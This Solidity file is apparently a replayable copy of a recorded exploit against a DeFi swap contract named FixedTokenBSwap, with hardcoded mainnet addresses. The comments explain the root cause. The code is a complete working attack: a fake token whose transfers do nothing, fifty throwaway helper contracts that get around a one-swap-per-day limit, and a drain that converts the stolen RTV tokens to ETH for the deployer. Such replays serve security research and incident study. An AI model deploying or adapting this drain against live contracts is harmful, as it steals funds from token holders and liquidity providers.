// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground — a faithful copy of
// FixedTokenBSwapAttack from
// evm-hack-registry/2025-06-FixedTokenBSwap_exp/test/FixedTokenBSwap_exp.sol,
// with one change needed only to make it replayable by the recorder:
//
// The original constructor is `payable` and receives `{value: 0.01 ether}` at
// deploy time (`new FixedTokenBSwapAttack{value: seed}(payable(ATTACKER))`),
// but the recorder's deploy call never carries msg.value. Here the entire
// attack body moves from the constructor into a callable `run()` entrypoint
// (the deploy itself is unrecorded by the playground, so the vulnerable calls
// must live in attackFunction, not the constructor), `profitReceiver` is
// hardcoded to `msg.sender` (the deployer/attacker — matching the original
// exactly, since `new FixedTokenBSwapAttack{value: seed}(payable(ATTACKER))`
// is deployed by the attacker who is also the passed-in profitReceiver), and
// the starting 0.01 ETH seed is funded via a pre-attack `setup.steps` rawCall
// to this contract's address instead of at deploy time (mirrors the
// 2025-04-tcdp.mjs / 2025-05-Nalakuvara_LotteryTicket50.mjs fix pattern —
// `run()` only reads `msg.value` at deploy time in the original, but here it
// reads `address(this).balance` when it starts, so funding it any time
// before the call is behaviorally identical, and keeps the funding out of
// the recorded native-profit "before" baseline).
//
// All addresses, call sequence, and logic are otherwise copied verbatim from
// the original test file's FixedTokenBSwapAttack + FixedTokenBSwapSingleSwap
// + FakeToken contracts.
//
// Root cause (see test/FixedTokenBSwap_exp.sol header): FixedTokenBSwap.swap()
// trusts UniswapV2Router.getAmountsIn() for a fully user-supplied `path` and
// then unconditionally sends a FIXED 10 RTV to msg.sender once tokenA's
// transferFrom() call succeeds — it never checks that the reported amountIn
// was actually paid at real value. The attacker deploys a FakeToken whose
// balanceOf() always answers 100 ether (used only to price a fresh
// FakeToken/RTV pair as an expensive quote for getAmountsIn) while
// transferFrom()/transfer()/approve() are all no-ops that move nothing. Fresh
// single-use helper contracts (FixedTokenBSwapSingleSwap) bypass
// FixedTokenBSwap's one-swap-per-sender-per-day gate, so the loop drains 10
// RTV per helper for free.

address constant FIXED_TOKEN_B_SWAP = 0x746b3d7E9953cDaa8C4d4Fd3ee24fE133f459F32;
address constant RTV_TOKEN = 0x61e24Ce4efe61EB2efd6AC804445df65f8032955;
address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

interface IFixedTokenBSwap {
    function swap(address[] calldata path, uint256 amountInMax) external;
}

interface ISyncPair {
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FixedTokenBSwapDrain {
    address payable private immutable profitReceiver;

    receive() external payable {}

    constructor() {
        profitReceiver = payable(msg.sender);
    }

    function run() external {
        address[] memory path = new address[](2);
        path[0] = WETH_TOKEN;
        path[1] = RTV_TOKEN;

        // Buy enough RTV to seed a fake-token/RTV pair used only as a pricing oracle.
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactETHForTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp
        );

        FakeToken fakeToken = new FakeToken();
        address fakePair = IUniswapV2Factory(UNISWAP_V2_FACTORY).createPair(address(fakeToken), RTV_TOKEN);

        IERC20(RTV_TOKEN).transfer(fakePair, IERC20(RTV_TOKEN).balanceOf(address(this)));
        ISyncPair(fakePair).sync();

        // FixedTokenBSwap allows one swap per sender per day, so use fresh senders.
        for (uint256 i = 0; i < 50; i++) {
            new FixedTokenBSwapSingleSwap(address(fakeToken), address(this));
        }

        IERC20(RTV_TOKEN).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        path[0] = RTV_TOKEN;
        path[1] = WETH_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactTokensForETH(
            490 ether, 0, path, address(this), block.timestamp
        );

        IERC20(RTV_TOKEN).transfer(profitReceiver, IERC20(RTV_TOKEN).balanceOf(address(this)));
        profitReceiver.transfer(address(this).balance);
    }
}

contract FixedTokenBSwapSingleSwap {
    constructor(address fakeToken, address receiver) {
        address[] memory path = new address[](2);
        path[0] = fakeToken;
        path[1] = RTV_TOKEN;

        IFixedTokenBSwap(FIXED_TOKEN_B_SWAP).swap(path, type(uint256).max);
        IERC20(RTV_TOKEN).transfer(receiver, IERC20(RTV_TOKEN).balanceOf(address(this)));

        selfdestruct(payable(receiver));
    }
}

contract FakeToken {
    function balanceOf(address) external pure returns (uint256) {
        return 100 ether;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}
